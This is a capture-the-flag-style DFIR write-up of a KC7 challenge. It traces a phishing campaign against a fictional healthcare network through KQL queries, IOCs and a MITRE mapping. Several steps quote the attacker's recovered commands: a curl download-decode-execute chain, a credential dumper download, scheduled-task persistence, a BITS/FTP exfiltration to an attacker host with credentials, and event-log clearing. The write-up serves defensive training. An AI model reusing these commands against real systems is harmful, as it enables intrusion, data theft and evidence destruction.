# Empire Health

A comprehensive threat investigation analyzing a sophisticated phishing campaign targeting U.S. service members at Empire Health, a New York healthcare network, culminating in data exfiltration by an external threat actor.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Medium-orange?style=flat-square) ![Platform](hxxps://img.shields[.]io/badge/Platform-KC7-blue?style=flat-square) ![Category](hxxps://img.shields[.]io/badge/Category-Threat%20Hunting%20%7C%20DFIR-purple?style=flat-square)

---

## Challenge Overview

| **Attribute**       | **Details**                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| **Challenge Name**  | Empire Health                                                               |
| **Author**          | David Brown                                                                 |
| **Platform**        | KC7 (kc7001.eastus.EmpireHealth)                                           |
| **Category**        | Threat Hunting, Digital Forensics & Incident Response                      |
| **Difficulty**      | Medium                                                                      |
| **Tools Used**      | KQL (Kusto Query Language), PowerShell forensics, Windows Event Log analysis|
| **Target/Box**      | GBAN-DESKTOP, GESE-DESKTOP (Empire Health internal network)                |

**Scenario:**

Empire Health, a New York healthcare network serving U.S. service members, was targeted by a sophisticated phishing campaign. Attackers delivered malicious ZIP files masquerading as veteran healthcare documents via external email domains. An employee, Eddie McFed (Federal Programs Coordinator), clicked a phishing link and downloaded `Veterans_Medical_Services.zip`. This initiated a multi-stage attack chain involving DLL sideloading, credential theft, lateral movement to the Director of Military Health Services' account (Dana Scully), and exfiltration of patient records to an attacker-controlled FTP server. The investigation leverages KQL queries against `ProcessEvents`, `Email`, `FileCreationEvents`, and `Employees` tables to reconstruct the attack timeline, identify IOCs, and map adversary behavior.

---

## Attack Timeline

| **Date/Time (UTC)**        | **Event**                                                                                          |
|----------------------------|----------------------------------------------------------------------------------------------------|
| 2024-03-18T12:44:34Z       | Eddie McFed (10.10[.]0.29) clicked phishing link, initiated GET request for Veterans_Medical_Services.zip |
| 2024-03-18T12:45:16Z       | Veterans_Medical_Services.zip written to C:\Users\edmcfed\Downloads\ via firefox[.]exe              |
| 2024-03-18T12:45:45Z       | Malicious LNK file benefit_information_veteran_affairs.pdf.lnk created                             |
| 2024-03-18T12:53:04Z       | wmpshare[.]exe created in C:\Program Files                                                           |
| 2024-03-18T12:53:26Z       | Decoy PDF benefit_information_veteran_affairs.pdf created                                          |
| 2024-03-18T12:54:08Z       | curl executed to download 1.txt from data.algoadvertise[.]com, saved as 1[.]bat                     |
| 2024-03-18T12:54:13Z       | 1[.]bat executed, decoded 2[.]bat using certutil                                                       |
| 2024-03-18T12:54:14Z       | 2[.]bat executed                                                                                     |
| 2024-03-18T12:54:56Z       | MsMpEng[.]exe and MpSvc.dll (DLL sideloading pair) downloaded from data.algoadvertise[.]com         |
| 2024-03-18T12:55:18Z       | MpSvc.dll written to C:\Users\Public\Documents\                                                   |
| 2024-03-18T12:56:05Z       | Scheduled task "Run Windows Defense System" created for persistence via MsMpEng[.]exe               |
| 2024-04-02T10:46:19Z       | MsMpEng[.]exe (Dana Scully's GESE-DESKTOP) compressed patient records from \\\\recordssrv01\confidential\ |
| 2024-04-02T10:48:11Z       | Browser credential dumper (dmp[.]exe) downloaded from data.algoadvertise[.]com                       |
| 2024-04-02T10:50:39Z       | dmp[.]exe executed targeting Chrome browser, extracting credentials for ehr.empirehealth[.]ny        |
| 2024-04-02T12:12:17Z       | 7z[.]exe archived stolen data into all.7z                                                            |
| 2024-04-02T12:12:44Z       | all.7z exfiltrated via Start-BitsTransfer to fxp://algoadvertise[.]com/incoming/empirehealth_dump/|
| 2024-04-02T13:10:44Z       | Event logs (Security, System, Application) cleared using wevtutil                                  |
| 2024-04-02T13:32:44Z       | Anti-forensics: C:\Users\Public\Documents\* files removed via Remove-Item                         |

---

## Solution Walkthrough

### Step 1 — Initial Reconnaissance: Identifying External Email Senders

**Objective:** Enumerate external email senders to identify phishing campaign origins.

**KQL Query:**
```kql
Email
| where sender !contains "empirehealth.ny"
| distinct sender
```

**Result:**
- **12,088 distinct external senders** identified (e.g., vickie.mcwilliams@mail[.]com, vickv.rossi@aol[.]com)
- Confirmed phishing emails originated from non-corporate domains

---

### Step 2 — Keyword Analysis: Military and Healthcare Lures

**Objective:** Identify phishing emails leveraging military/healthcare themes.

**KQL Query:**
```kql
Email
| where sender !contains "empirehealth.ny"
| where link has "military"
| distinct sender
```

**Result:**
- **17 distinct senders** used "military" keyword in links

**KQL Query:**
```kql
Email
| where sender !contains "empirehealth.ny"
| where link contains "healthcare"
| distinct link
```

**Result:**
- **4 distinct malicious links** found:
  - hxxp://armedforceshealthcare[.]net/public/public/modules/Veterans_Medical_Services.zip
  - hxxp://militaryfamilyhealth[.]org/online/search/Military_Healthcare_Guide.zip
  - hxxp://armedforceshealthcare[.]net/published/search/Military_Healthcare_Guide.zip
  - hxxp://armedforceshealthcare[.]net/online/search/Services_Member_Healthcare_Benefits.zip

---

### Step 3 — File Extension and Recipient Analysis

**Objective:** Determine malicious file type and targeted employees.

**KQL Query:**
```kql
Email
| where sender !contains "empirehealth.ny"
| where link contains "zip"
| distinct link
```

**Result:**
- **File extension:** .zip
- **Distinct malicious file names:** 3
- **Key recipient:** eddie_mcfed@empirehealth[.]ny

---

### Step 4 — Employee Attribution: Eddie McFed

**Objective:** Profile the initial victim.

**KQL Query:**
```kql
Employees
| where email_addr == "eddie_mcfed@empirehealth.ny"
| project hostname, name, role, ip_addr
```

**Result:**
- **Name:** Eddie McFed
- **Role:** Federal Programs Coordinator
- **IP Address:** 10.10[.]0.29
- **Hostname:** GBAN-DESKTOP

---

### Step 5 — Network Event Correlation: Link Click Confirmation

**Objective:** Confirm user interaction with phishing link.

**KQL Query:**
```kql
let phishing_emails = 
Email
| where sender !contains "empirehealth.ny"
| where link contains "healthcare"
| distinct link;
OutboundNetworkEvents
| where src_ip == "10.10.0.29"
| where url in (phishing_emails)
```

**Result:**
- **Timestamp:** 2024-03-18T12:44:34Z
- **User-Agent:** Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Win64; x64; Trident/4.0)
- **URL:** hxxp://armedforceshealthcare[.]net/public/public/modules/Veterans_Medical_Services.zip

---

### Step 6 — File Creation Event: ZIP Download

**Objective:** Verify malicious file download.

**KQL Query:**
```kql
FileCreationEvents
| where hostname == "GBAN-DESKTOP"
| where filename == "Veterans_Medical_Services.zip"
```

**Result:**
- **Timestamp:** 2024-03-18T12:45:16Z
- **Path:** C:\Users\edmcfed\Downloads\Veterans_Medical_Services.zip
- **SHA256:** d17275ae115eda1e06625ca041fc55a634c054f21cd81693ea2bf81580760bb3f
- **Process:** firefox[.]exe

---

### Step 7 — Post-Exploitation Artifacts: LNK and Batch Files

**Objective:** Identify secondary payloads.

**KQL Query:**
```kql
FileCreationEvents
| where hostname == "GBAN-DESKTOP"
| where timestamp >= datetime(2024-03-18T12:45:16.000Z)
| project timestamp, filename, path, sha256
```

**Result:**
- **benefit_information_veteran_affairs.pdf.lnk** created at 2024-03-18T12:45:45Z (Windows shortcut used as dropper)
- **1[.]bat** and **2[.]bat** created in C:\Users\Public\Documents\
- **MpSvc.dll** created at 2024-03-18T12:55:18Z (malicious DLL for sideloading)

---

### Step 8 — Command Execution Analysis: Multi-Stage Payload

**Objective:** Reconstruct attacker command chain.

**KQL Query:**
```kql
ProcessEvents
| where hostname == "GBAN-DESKTOP"
| where timestamp >= datetime(2024-03-18T12:45:45.000Z)
| project process_commandline, parent_process_name, process_name
```

**Result:**
```bash
curl https://data.algoadvertise[.]com/data/usershares/rsergey/1.txt -o C:\Users\Public\Documents\1.bat && certutil -decode C:\Users\Public\Documents\1.bat C:\Users\Public\Documents\2.bat && start C:\Users\Public\Documents\2.bat
```

- **Downloaded file:** 1.txt (Base64-encoded payload)
- **Decoded output:** 2[.]bat
- **Execution:** 2[.]bat launched additional stages

---

### Step 9 — DLL Sideloading Identification

**Objective:** Identify persistence mechanism.

**KQL Query:**
```kql
ProcessEvents
| where hostname == "GBAN-DESKTOP"
| where timestamp >= datetime(2024-03-18T12:45:45.000Z)
| where process_commandline contains "documents"
| project timestamp, process_commandline, parent_process_name, process_name
```

**Result:**
```bash
curl https://data.algoadvertise[.]com/data/usershares/rsergey/p.exe -o C:\Users\Public\Documents\MsMpEng.exe && curl https://data.algoadvertise[.]com/data/usershares/rsergey/h.dll -o C:\Users\Public\Documents\MpSvc.dll
```

- **Attack Technique:** DLL sideloading (legitimate-looking MsMpEng[.]exe loads malicious MpSvc.dll)
- **Scheduled Task Created:**
```bash
schtasks /create /sc daily /tn "Run Windows Defense System" /tr "C:\Users\Public\Documents\MsMpEng.exe" /st 00:00
```

---

### Step 10 — Lateral Movement: Dana Scully Compromise

**Objective:** Identify lateral movement and second victim.

**KQL Query:**
```kql
ProcessEvents
| where parent_process_name contains "MsMpEng"
| project timestamp, hostname, username, process_commandline
```

**Result:**
- **Hostname:** GESE-DESKTOP
- **Username:** dascully
- **Role (from Employees table):** Director of Military Health Services
- **First malicious process:** 2024-04-02T10:46:19Z

---

### Step 11 — Data Collection and Credential Theft

**Objective:** Identify data exfiltration preparation.

**Process Events (GESE-DESKTOP, user: dascully):**

1. **Patient Records Compression (2024-04-02T10:46:19Z):**
```powershell
$data = Get-ChildItem -Path '\\recordssrv01\confidential\service_members\patient_records_2024\' -Recurse; Compress-Archive -Path $data.FullName -DestinationPath 'C:\Users\Public\Documents\patient_records.zip'
```

2. **Browser Credential Dumper Download (2024-04-02T10:48:11Z):**
```powershell
Invoke-WebRequest -Uri "https://data.algoadvertise[.]com/tools/dmp.exe" -OutFile "C:\Users\Public\Documents\dmp.exe"
```

3. **EHR Credential Theft (2024-04-02T10:50:39Z):**
```bash
C:\Users\Public\Documents\dmp.exe -target_browser Chrome -target_site ehr.empirehealth.ny -output C:\Users\Public\Documents\browser_dump.txt
```
- **Target Domain:** ehr.empirehealth[.]ny (Electronic Health Records system)

4. **Archive Creation (2024-04-02T12:12:17Z):**
```bash
7z.exe a -t7z C:\Users\Public\Documents\all.7z C:\Users\Public\Documents\*
```

---

### Step 12 — Data Exfiltration via FTP

**Objective:** Confirm data exfiltration.

**KQL Query:**
```kql
ProcessEvents
| where hostname == "GESE-DESKTOP"
| where timestamp >= datetime(2024-04-02T12:12:44Z)
| project timestamp, username, process_commandline
```

**Result (2024-04-02T12:12:44Z):**
```powershell
$pass = ConvertTo-SecureString 'r0b3rts3rgeyr0cks' -AsPlainText -Force; $user = 'algo-secure-uploader'; $cred = New-Object System.Management.Automation.PSCredential($user, $pass); Start-BitsTransfer -Source 'C:\Users\Public\Documents\all.7z' -Destination 'ftp://algoadvertise[.]com/incoming/empirehealth_dump/' -Credential $cred
```

- **Exfiltration Method:** Start-BitsTransfer (PowerShell BITS)
- **Destination:** fxp://algoadvertise[.]com/incoming/empirehealth_dump/
- **Credentials:** algo-secure-uploader / r0b3rts3rgeyr0cks

---

### Step 13 — Anti-Forensics: Log and File Deletion

**Objective:** Document evidence destruction.

**Log Clearing (2024-04-02T13:10:44Z):**
```bash
wevtutil cl Security && wevtutil cl System && wevtutil cl Application
```

**File Deletion (2024-04-02T13:32:44Z):**
```powershell
Remove-Item -Path 'C:\Users\Public\Documents\*' -Force
```

---

## IOC Table

| **Type**       | **Indicator**                                                                                  | **Context**                                      | **Threat Actor**  |
|----------------|------------------------------------------------------------------------------------------------|--------------------------------------------------|-------------------|
| Domain         | algoadvertise[.]com                                                                            | C2 infrastructure, file hosting, FTP exfiltration| Robert Sergey (AlgoAdvertise LLC CEO) |
| Domain         | data.algoadvertise[.]com                                                                       | File hosting subdomain                           | Robert Sergey     |
| Domain         | armedforceshealthcare[.]net                                                                    | Phishing landing page                            | Robert Sergey     |
| Domain         | militaryfamilyhealth[.]org                                                                     | Phishing landing page                            | Robert Sergey     |
| URL            | hxxp://armedforceshealthcare[.]net/public/public/modules/Veterans_Medical_Services.zip         | Initial phishing payload                         | Robert Sergey     |
| URL            | hxxps://data.algoadvertise[.]com/data/usershares/rsergey/1.txt                                 | Stage 1 encoded batch script                     | Robert Sergey     |
| URL            | hxxps://data.algoadvertise[.]com/data/usershares/rsergey/p[.]exe                                 | Malicious MsMpEng[.]exe executable                 | Robert Sergey     |
| URL            | hxxps://data.algoadvertise[.]com/data/usershares/rsergey/h.dll                                 | Malicious MpSvc.dll (sideloading)                | Robert Sergey     |
| URL            | fxp://algoadvertise[.]com/incoming/empirehealth_dump/                                          | Data exfiltration FTP server                     | Robert Sergey     |
| IP Address     | 10.10[.]0.29                                                                                   | Eddie McFed's workstation (GBAN-DESKTOP)         | N/A (victim)      |
| IP Address     | 10.10[.]0.11                                                                                   | Dana Scully's workstation (GESE-DESKTOP)         | N/A (victim)      |
| File Hash      | d17275ae115eda1e06625ca041fc55a634c054f21cd81693ea2bf81580760bb3f                               | Veterans_Medical_Services.zip (SHA256)           | Robert Sergey     |
| File Name      | Veterans_Medical_Services.zip                                                                  | Initial phishing payload                         | Robert Sergey     |
| File Name      | benefit_information_veteran_affairs.pdf.lnk                                                    | Malicious Windows shortcut                       | Robert Sergey     |
| File Name      | 1[.]bat                                                                                          | Base64-encoded batch script                      | Robert Sergey     |
| File Name      | 2[.]bat                                                                                          | Decoded batch script                             | Robert Sergey     |
| File Name      | MsMpEng[.]exe                                                                                    | Legitimate-looking executable (DLL sideloading)  | Robert Sergey     |
| File Name      | MpSvc.dll                                                                                      | Malicious DLL payload                            | Robert Sergey     |
| File Name      | dmp[.]exe                                                                                        | Browser credential dumper                        | Robert Sergey     |
| File Name      | all.7z                                                                                         | Exfiltration archive                             | Robert Sergey     |
| Credential     | algo-secure-uploader / r0b3rts3rgeyr0cks                                                       | FTP credentials for exfiltration                 | Robert Sergey     |
| Email          | vickie.mcwilliams[@]mail[.]com                                                                 | External phishing sender                         | Robert Sergey     |
| Email          | vickv.rossi[@]aol[.]com                                                                        | External phishing sender                         | Robert Sergey     |
| Network Share  | \\\\recordssrv01\confidential\service_members\patient_records_2024\                            | Targeted patient records repository              | N/A (target)      |
| Scheduled Task | "Run Windows Defense System"                                                                   | Persistence mechanism                            | Robert Sergey     |

---

## MITRE ATT&CK Mapping

| **Tactic**              | **Technique ID** | **Technique Name**                                  | **Evidence**                                                                                     |
|-------------------------|------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------|
| Initial Access          | T1566.001        | Phishing: Spearphishing Attachment                  | Veterans_Medical_Services.zip delivered via email to eddie_mcfed@empirehealth[.]ny             |
| Initial Access          | T1566.002        | Phishing: Spearphishing Link                        | Email link to hxxp://armedforceshealthcare[.]net clicked at 2024-03-18T12:44:34Z                |
| Execution               | T1204.002        | User Execution: Malicious File                      | Eddie McFed executed Veterans_Medical_Services.zip                                               |
| Execution               | T1059.001        | Command and Scripting Interpreter: PowerShell       | Multiple PowerShell commands (Compress-Archive, Start-BitsTransfer, ConvertTo-SecureString)     |
| Execution               | T1059.003        | Command and Scripting Interpreter: Windows Command Shell | 1[.]bat, 2[.]bat executed; curl and certutil invoked via cmd[.]exe                                   |
| Execution               | T1053.005        | Scheduled Task/Job: Scheduled Task                  | schtasks /create for "Run Windows Defense System" at 2024-03-18T12:56:05Z                       |
| Persistence             | T1053.005        | Scheduled Task/Job: Scheduled Task                  | Daily scheduled task executing MsMpEng[.]exe at 00:00                                              |
| Persistence             | T1574.002        | Hijack Execution Flow: DLL Side-Loading             | MsMpEng[.]exe sideloads malicious MpSvc.dll from C:\Users\Public\Documents\                        |
| Defense Evasion         | T1036.005        | Masquerading: Match Legitimate Name or Location     | MsMpEng[.]exe impersonates Windows Defender Antimalware Service Executable                         |
| Defense Evasion         | T1140           | Deobfuscate/Decode Files or Information             | certutil -decode used to decode 1[.]bat into 2[.]bat at 2024-03-18T12:54:13Z                        |
| Defense Evasion         | T1070.001        | Indicator Removal: Clear Windows Event Logs         | wevtutil cl Security && wevtutil cl System && wevtutil cl Application at 2024-04-02T13:10:44Z   |
| Defense Evasion         | T1070.004        | Indicator Removal: File Deletion                    | Remove-Item -Path 'C:\Users\Public\Documents\*' at 2024-04-02T13:32:44Z                         |
| Credential Access       | T1555.003        | Credentials from Password Stores: Credentials from Web Browsers | dmp[.]exe -target_browser Chrome -target_site ehr.empirehealth[.]ny at 2024-04-02T10:50:39Z      |
| Discovery               | T1087.002        | Account Discovery: Domain Account                   | Employees table queried for role-based targeting (IT roles, Federal Programs Coordinator)        |
| Lateral Movement        | T1021.002        | Remote Services: SMB/Windows Admin Shares           | Access to \\\\recordssrv01\confidential\ from GESE-DESKTOP                                       |
| Collection              | T1560.001        | Archive Collected Data: Archive via Utility         | 7z[.]exe a -t7z C:\Users\Public\Documents\all.7z at 2024-04-02T12:12:17Z                          |
| Collection              | T1005           | Data from Local System                              | patient_records.zip, browser_dump.txt collected from local system                                |
| Collection              | T1039           | Data from Network Shared Drive                      | Get-ChildItem -Path '\\\\recordssrv01\confidential\service_members\patient_records_2024\'        |
| Command and Control     | T1071.001        | Application Layer Protocol: Web Protocols           | curl commands to data.algoadvertise[.]com; Invoke-WebRequest for tool downloads                 |
| Command and Control     | T1105           | Ingress Tool Transfer                               | dmp[.]exe, MsMpEng[.]exe, MpSvc.dll downloaded from attacker infrastructure                          |
| Exfiltration            | T1041           | Exfiltration Over C2 Channel                        | Start-BitsTransfer to fxp://algoadvertise[.]com/incoming/empirehealth_dump/ at 2024-04-02T12:12:44Z |
| Exfiltration            | T1048.003        | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | FTP used for exfiltration (unencrypted)                                                          |

---

## Tools Used

- **KQL (Kusto Query Language)** — Primary query language for analyzing Email, ProcessEvents, FileCreationEvents, OutboundNetworkEvents, and Employees tables in the KC7 platform
- **curl** — Command-line tool abused by attacker to download payloads from data.algoadvertise[.]com
- **certutil** — Windows certificate utility abused for Base64 decoding of malicious batch scripts (Living off the Land technique)
- **7z[.]exe** — Archive utility used to compress stolen data into all.7z
- **PowerShell** — Leveraged for data collection (Compress-Archive, Get-ChildItem), credential conversion (ConvertTo-SecureString), and exfiltration (Start-BitsTransfer)
- **schtasks** — Windows task scheduler utility used to establish persistence via scheduled task
- **wevtutil** — Windows event log utility abused to clear Security, System, and Application logs for anti-forensics
- **dmp[.]exe** — Custom browser credential dumper targeting Chrome, extracting credentials for ehr.empirehealth[.]ny
- **firefox[.]exe** — Browser used by Eddie McFed to download initial phishing payload

---

## Key Takeaways

1. **Multi-Stage Phishing Requires Email Link and File Analysis** — Defenders must correlate Email table sender/link fields with OutboundNetworkEvents and FileCreationEvents to confirm user interaction and file delivery. The use of ZIP files with military/healthcare themes demonstrates social engineering tailored to victim demographics (service members).

2. **DLL Sideloading Detection Requires Process-Parent-DLL Correlation** — The attacker abused legitimate executable naming (MsMpEng[.]exe) to sideload malicious MpSvc.dll from an unusual path (C:\Users\Public\Documents\). Detection requires alerting on mismatches between expected DLL load paths and actual parent process locations, especially for security software binaries.

3. **Living off the Land Binaries (LOLBins) Enable Defense Evasion** — Attackers leveraged certutil (Base64 decoding), curl (payload download), schtasks (persistence), and wevtutil (log clearing) — all native Windows utilities. Defenders should baseline legitimate LOLBin usage and alert on anomalous command-line arguments (e.g., certutil -decode, wevtutil cl).

4. **Credential Theft from Browsers Requires EDR Monitoring of Browser Process Children** — The dmp[.]exe tool targeted Chrome's credential store for the EHR system (ehr.empirehealth[.]ny). Defenders should monitor for child processes of browsers with suspicious command-line arguments (e.g., -target_browser, -output) and unexpected file access patterns to browser credential databases.

5. **FTP Exfiltration with Embedded Credentials Highlights Need for Outbound Protocol Filtering** — The attacker exfiltrated 7z-compressed archives via unencrypted FTP using hardcoded credentials (r0b3rts3rgeyr0cks). Organizations should restrict outbound FTP, monitor Start-BitsTransfer usage in PowerShell, and decrypt/inspect PowerShell script blocks for Base64-encoded credentials or exfiltration commands.

6. **Anti-Forensics Activity (Log Clearing, File Deletion) Signals Advanced Adversary** — The attacker cleared Security, System, and Application event logs and deleted staging artifacts from C:\Users\Public\Documents\. Defenders should forward Windows event logs to a SIEM in real-time (preventing local deletion), enable PowerShell script block logging (Event ID 4104), and alert on wevtutil or Remove-Item targeting Public/Temp directories.

---

## References

- [MITRE ATT&CK T1566.001 - Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK T1574.002 - Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
- [MITRE ATT&CK T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
- [MITRE ATT&CK T1555.003 - Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
- [MITRE ATT&CK T1070.001 - Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)
- [MITRE ATT&CK T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [KC7 Cybersecurity Training Platform](hxxps://kc7cyber[.]com/)
- [Microsoft Kusto Query Language (KQL) Documentation](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)
- [LOLBAS Project - Living Off The Land Binaries and Scripts](hxxps://lolbas-project.github[.]io/)
- [NIST SP 800-61 Rev. 2 - Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)

---

*Author: David Brown | Platform: KC7 (kc7001.eastus.EmpireHealth) | Date: 2024-05-17*